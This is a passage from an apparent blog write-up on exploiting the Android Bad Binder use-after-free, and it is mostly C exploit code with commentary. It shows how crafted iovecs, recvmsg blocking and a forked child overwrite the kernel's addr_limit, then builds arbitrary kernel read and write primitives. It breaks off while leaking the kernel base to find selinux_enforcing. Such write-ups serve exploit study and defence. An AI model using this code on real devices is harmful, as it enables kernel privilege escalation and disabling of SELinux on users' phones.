highlighter-rouge">iov_len</code> to <code class="language-plaintext highlighter-rouge">iovecs[10].iov_base</code>. And if you remember from <a href="#child-process--cause-unlinking">Child Process Cause unlinking</a>, <code class="language-plaintext highlighter-rouge">iovecs[10].iov_len</code> becomes <code class="language-plaintext highlighter-rouge">binder_thread_ptr</code> which is really big number. Therefore, it will just skip out on processing <code class="language-plaintext highlighter-rouge">iovecs[11]</code>.</p><p><strong>iov_iter.c readv</strong></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">copy_page_to_iter_iovec</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">,</span>
                         <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">i</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">size_t</span> <span class="n">skip</span><span class="p">,</span> <span class="n">copy</span><span class="p">,</span> <span class="n">left</span><span class="p">,</span> <span class="n">wanted</span><span class="p">;</span>
        <span class="k">const</span> <span class="k">struct</span> <span class="n">iovec</span> <span class="o">*</span><span class="n">iov</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
        <span class="kt">void</span> <span class="o">*</span><span class="n">kaddr</span><span class="p">,</span> <span class="o">*</span><span class="n">from</span><span class="p">;</span>
        <span class="p">[...]</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">left</span> <span class="o">&amp;&amp;</span> <span class="n">bytes</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">iov</span><span class="o">++</span><span class="p">;</span>
                <span class="n">buf</span> <span class="o">=</span> <span class="n">iov</span><span class="o">-&gt;</span><span class="n">iov_base</span><span class="p">;</span>
                <span class="n">copy</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="n">iov</span><span class="o">-&gt;</span><span class="n">iov_len</span><span class="p">);</span>
                <span class="n">left</span> <span class="o">=</span> <span class="n">copyout</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">from</span><span class="p">,</span> <span class="n">copy</span><span class="p">);</span>
                <span class="p">[...]</span>
        <span class="p">}</span>
        <span class="p">[...]</span>
        <span class="k">return</span> <span class="n">wanted</span> <span class="o">-</span> <span class="n">bytes</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>In <a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">Project Zero blog</a>, they use <code class="language-plaintext highlighter-rouge">recvmsg</code> instead since it allows blocking by passing <code class="language-plaintext highlighter-rouge">MSG_WAITALL</code> flag.</p><h4 id="initializing-for-overriding-addr_limit"><span class="mr-2">Initializing for Overriding addr_limit</span><a href="#initializing-for-overriding-addr_limit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">msghdr</span> <span class="n">message</span> <span class="o">=</span> <span class="p">{</span><span class="n">nullptr</span><span class="p">};</span>
<span class="k">struct</span> <span class="n">iovec</span> <span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_COUNT</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">nullptr</span><span class="p">};</span>
<span class="kt">int</span> <span class="n">sock_fd</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">int</span> <span class="n">binder_fd</span> <span class="o">=</span> <span class="n">open_binder</span><span class="p">();</span>
<span class="kt">int</span> <span class="n">epfd</span> <span class="o">=</span> <span class="n">create_epoll</span><span class="p">();</span>
<span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sock_fd</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">char</span> <span class="n">junk_sock_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x41</span><span class="p">};</span>
<span class="n">write</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">junk_sock_data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">junk_sock_data</span><span class="p">));</span><span class="c1">// should sent 1 bytes</span>
</pre></table></code></div></div><p>Similar setup to <a href="#initializing-for-task_struct-leak">initializing for task_struct leak</a>. Difference is we use <code class="language-plaintext highlighter-rouge">socketpair</code> instead of <code class="language-plaintext highlighter-rouge">pipe</code> so we can use <code class="language-plaintext highlighter-rouge">recvmsg</code>. Also, we have to send some junk data so that when <code class="language-plaintext highlighter-rouge">recvmsg</code> is called, it processes the junk data and kmalloc <code class="language-plaintext highlighter-rouge">iovecs</code> in kernel.</p><h4 id="setting-up-iovecs"><span class="mr-2">Setting up iovecs</span><a href="#setting-up-iovecs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">m_lock_page</span><span class="p">;</span>            <span class="c1">// binder_thread-&gt;wait.lock</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>                       <span class="c1">// binder_thread-&gt;wait.head.next</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x41414141</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.head.prev</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">;</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x42424242</span><span class="p">;</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span>

<span class="kt">uint64_t</span> <span class="n">addr_limit_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">m_task_struct_ptr</span> <span class="o">+</span> <span class="n">OFFSET_TASK_STRUCT_ADDR_LIMIT</span><span class="p">);</span>
<span class="n">info</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">addr_limit_ptr: 0x%lx"</span><span class="p">,</span> <span class="n">addr_limit_ptr</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">uint64_t</span> <span class="n">override_binder_thread_wait</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0x1</span><span class="p">,</span>                   <span class="c1">// iovecStack[IOVEC_WQ_INDEX].iov_len</span>
    <span class="mh">0x41414141</span><span class="p">,</span>            <span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base</span>
    <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span> <span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len</span>
    <span class="n">addr_limit_ptr</span><span class="p">,</span>        <span class="c1">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base</span>
    <span class="mh">0xFFFFFFFFFFFFFFFE</span>     <span class="c1">// addr_limit value. It will be written to addr_limit_ptr above</span>
<span class="p">};</span>

<span class="n">message</span><span class="p">.</span><span class="n">msg_iov</span> <span class="o">=</span> <span class="n">iovecs</span><span class="p">;</span>
<span class="n">message</span><span class="p">.</span><span class="n">msg_iovlen</span> <span class="o">=</span> <span class="n">IOVEC_COUNT</span><span class="p">;</span>
</pre></table></code></div></div><p><a href="/assets/img/2023-05-27-16-44-04.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-44-04.png" alt="" class="lazyload" data-proofer-ignore></a></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">m_lock_page</span><span class="p">;</span>            <span class="c1">// binder_thread-&gt;wait.lock</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>                       <span class="c1">// binder_thread-&gt;wait.head.next</span>
</pre></table></code></div></div><p>First iovec that gets read is <code class="language-plaintext highlighter-rouge">iovecs[10]</code> . And it has <code class="language-plaintext highlighter-rouge">iov_len</code> of 1. This is so that when we do call <code class="language-plaintext highlighter-rouge">recvmsg(sock_fd[0], &amp;message, MSG_WAITALL);</code>. It processes our junk data write ` write(sock_fd[1], junk_sock_data, sizeof(junk_sock_data));`.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x41414141</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.head.prev</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">;</span>
</pre></table></code></div></div><p>Second iovec that will get read will be from <code class="language-plaintext highlighter-rouge">child</code> process after they do <code class="language-plaintext highlighter-rouge">unlinking</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_WQ_INDEX</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x42424242</span><span class="p">;</span>
<span class="n">iovecs</span><span class="p">[</span><span class="n">IOVEC_WQ_INDEX</span> <span class="o">+</span> <span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span>
</pre></table></code></div></div><p>Third iovec will be used to override <code class="language-plaintext highlighter-rouge">addr_limit</code>. <code class="language-plaintext highlighter-rouge">iov_base: 0x42424242</code> will be replace with <code class="language-plaintext highlighter-rouge">addr_limit_ptr</code> address in <code class="language-plaintext highlighter-rouge">child</code> process. It will go over more about this down the road.</p><h4 id="linking-binder_thread-and-eppoll_event-1"><span class="mr-2">Linking binder_thread and eppoll_event</span><a href="#linking-binder_thread-and-eppoll_event-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">epoll_add</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">binder_fd</span><span class="p">);</span>
</pre></table></code></div></div><p>Connecting structure together. Explained at <a href="#linking-epitem---epoll_entry---binder_thread">Linking epitem -&gt; epoll_entry -&gt; binder_thread</a></p><h4 id="forking-1"><span class="mr-2">Forking</span><a href="#forking-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">pid_t</span> <span class="n">child_pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
</pre></table></code></div></div><p>We will now have <code class="language-plaintext highlighter-rouge">child</code> and <code class="language-plaintext highlighter-rouge">parent</code> happening at same time. But first we will look at <code class="language-plaintext highlighter-rouge">parent</code> because <code class="language-plaintext highlighter-rouge">child</code> will <code class="language-plaintext highlighter-rouge">sleep(2)</code>.</p><h5 id="parent-free-binder_thread-and-block-via-recvmsg"><span class="mr-2">(Parent) Free binder_thread and block via recvmsg</span><a href="#parent-free-binder_thread-and-block-via-recvmsg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">binder_thread_exit</span><span class="p">(</span><span class="n">binder_fd</span><span class="p">);</span>

<span class="c1">// Should recv sum of all iov_len</span>
<span class="kt">ssize_t</span> <span class="n">bytes_received</span> <span class="o">=</span> <span class="n">recvmsg</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">message</span><span class="p">,</span> <span class="n">MSG_WAITALL</span><span class="p">);</span>

<span class="n">wait</span><span class="p">(</span><span class="n">nullptr</span><span class="p">);</span>
</pre></table></code></div></div><p>Frees <code class="language-plaintext highlighter-rouge">binder_thread</code> and waits for all <code class="language-plaintext highlighter-rouge">iovecs</code> to be <code class="language-plaintext highlighter-rouge">write</code> from <code class="language-plaintext highlighter-rouge">child</code> process. Currently, it processed <code class="language-plaintext highlighter-rouge">iovecs[10]</code> which is junk data with <code class="language-plaintext highlighter-rouge">iov_len</code> of <code class="language-plaintext highlighter-rouge">1</code>.</p><h5 id="child-unlink-then-write-to-iovecs11"><span class="mr-2">(Child) Unlink then write to <code class="language-plaintext highlighter-rouge">iovecs[11]</code></span><a href="#child-unlink-then-write-to-iovecs11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">uint64_t</span> <span class="n">override_binder_thread_wait</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
<span class="mh">0x1</span><span class="p">,</span> <span class="c1">// iovecs[10].iov_len</span>
<span class="mh">0x41414141</span><span class="p">,</span> <span class="c1">// iovecx[11].iov_base</span>
<span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">,</span> <span class="c1">// iovecx[11].iov_len</span>
<span class="n">addr_limit_ptr</span><span class="p">,</span> <span class="c1">// iovecs[12].iov_base</span>
<span class="mh">0xFFFFFFFFFFFFFFFE</span> <span class="c1">// addr_limit value. It will be written to addr_limit_ptr above</span>
<span class="p">};</span>
</pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="n">epoll_del</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">binder_fd</span><span class="p">);</span>

<span class="n">write</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">override_binder_thread_wait</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">override_binder_thread_wait</span><span class="p">));</span>

<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
</pre></table></code></div></div><p>It is similar to <a href="#child-process--cause-unlinking">(Child Process) Cause unlinking</a>. But we will <code class="language-plaintext highlighter-rouge">write</code> to <code class="language-plaintext highlighter-rouge">recvmsg</code> after unlinking and <code class="language-plaintext highlighter-rouge">iovecs</code> will look something like below after we <code class="language-plaintext highlighter-rouge">write</code>.</p><p>Interesting part is that our second iovec we are planned to write (0x8 * 4) == 32 bytes.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x41414141</span><span class="p">;</span> <span class="c1">// binder_thread-&gt;wait.head.prev</span>
<span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">;</span>
</pre></table></code></div></div><p>But we send (0x8 * 5) == 40 bytes (<code class="language-plaintext highlighter-rouge">sizeof(struct override_binder_thread_wait)</code>). The reason is first 32 bytes will be written to <code class="language-plaintext highlighter-rouge">binder_thread.wait</code> which is actually where <strong><code class="language-plaintext highlighter-rouge">iovecs[10].iov_len</code></strong> is. So we have to make sure we override the area with same data except override <code class="language-plaintext highlighter-rouge">iovecs[12].iov_base</code> with <code class="language-plaintext highlighter-rouge">addr_limit_ptr</code>.</p><p>The extra write which is <code class="language-plaintext highlighter-rouge">0xFFFFFFFFFFFFFFFE</code> will store that in <code class="language-plaintext highlighter-rouge">iovecs[1].iov_base</code> which is now <code class="language-plaintext highlighter-rouge">addr_limit_ptr</code>.</p><p><strong>Red is where it have been replaced with override_binder_thread_wait</strong> <a href="/assets/img/2023-05-27-16-45-25.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-45-25.png" alt="" class="lazyload" data-proofer-ignore></a></p><h5 id="parent-unblocked-recvmsg"><span class="mr-2">(Parent) Unblocked recvmsg</span><a href="#parent-unblocked-recvmsg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kt">ssize_t</span> <span class="n">bytes_received</span> <span class="o">=</span> <span class="n">recvmsg</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">message</span><span class="p">,</span> <span class="n">MSG_WAITALL</span><span class="p">);</span>

<span class="kt">ssize_t</span> <span class="n">expected_bytes_received</span> <span class="o">=</span> <span class="n">iovecs</span><span class="p">[</span><span class="mi">10</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">+</span>
                                  <span class="n">iovecs</span><span class="p">[</span><span class="mi">11</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">+</span>
                                  <span class="n">iovecs</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">iov_len</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="n">bytes_received</span> <span class="o">!=</span> <span class="n">expected_bytes_received</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">err</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">bytes_received: 0x%lx, expected: 0x%lx"</span><span class="p">,</span> <span class="n">bytes_received</span><span class="p">,</span> <span class="n">expected_bytes_received</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">wait</span><span class="p">(</span><span class="n">nullptr</span><span class="p">);</span>
</pre></table></code></div></div><p>Since child process have sent correct amount of bytes <code class="language-plaintext highlighter-rouge">write</code>, it should have been unblocked. Also we have <code class="language-plaintext highlighter-rouge">addr_limit_ptr</code> to set to <code class="language-plaintext highlighter-rouge">0xFFFFFFFFFFFFFFFE</code></p><h3 id="arbitrary-rw"><span class="mr-2">Arbitrary R/W</span><a href="#arbitrary-rw" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since we have overwritten <code class="language-plaintext highlighter-rouge">addr_limit</code> we should be able to <code class="language-plaintext highlighter-rouge">write</code> and <code class="language-plaintext highlighter-rouge">read</code> anywhere.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="n">BadBinder</span><span class="o">::</span><span class="n">arb_read</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"arb_read: addr: 0x%lx, size: 0x%lx"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="c1">// write to pipe</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">m_rw_pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">!=</span> <span class="n">size</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Unable to write to pipe"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// read from pipe</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">m_rw_pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">!=</span> <span class="n">size</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Unable to read from pipe"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">BadBinder</span><span class="o">::</span><span class="n">arb_write</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"arb_write: addr: 0x%lx, size: 0x%lx"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="c1">// write to pipe</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">m_rw_pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">!=</span> <span class="n">size</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Unable to write to pipe"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// read from pipe</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">m_rw_pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">!=</span> <span class="n">size</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">Unable to read from pipe"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Here we just use <code class="language-plaintext highlighter-rouge">pipe</code> because its convenient to use pipe to <code class="language-plaintext highlighter-rouge">write</code> and <code class="language-plaintext highlighter-rouge">read</code> then opening something like file to pass to <code class="language-plaintext highlighter-rouge">write</code> and <code class="language-plaintext highlighter-rouge">read</code>. You can just use <code class="language-plaintext highlighter-rouge">STDOUT</code> or <code class="language-plaintext highlighter-rouge">STDIN</code> FD to do this as well but then it will just <code class="language-plaintext highlighter-rouge">write/recv</code> from terminal which is not ideal.</p><h3 id="getting-kernel-base-to-get-selinux_enforcing-address"><span class="mr-2">Getting Kernel Base to get selinux_enforcing Address</span><a href="#getting-kernel-base-to-get-selinux_enforcing-address" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since we now have <code class="language-plaintext highlighter-rouge">arbitary R/W</code> as well as <code class="language-plaintext highlighter-rouge">task_struct_ptr</code>, we should be able to get kernel base by reading <code class="language-plaintext highlighter-rouge">nsproxy</code> field of task_struct by substracting <code class="language-plaintext highlighter-rouge">nsproxy_ptr - nsproxy_offset_to_kbase</code>).</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>
<span class="kt">void</span> <span class="n">BadBinder</span><span class="o">::</span><span class="n">get_kbase</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"Getting kaslr base by leaking nsproxy from task_struct"</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">nsproxy</span> <span class="o">=</span> <span class="n">read_u64</span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">m_task_struct_ptr</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">nsproxy</span><span class="p">));</span>
    <span class="n">info</span><span class="p">(</span><span class="s">"nsproxy: 0x%lx"</span><span class="p">,</span> <span class="n">nsproxy</span><span class="p">);</span> 

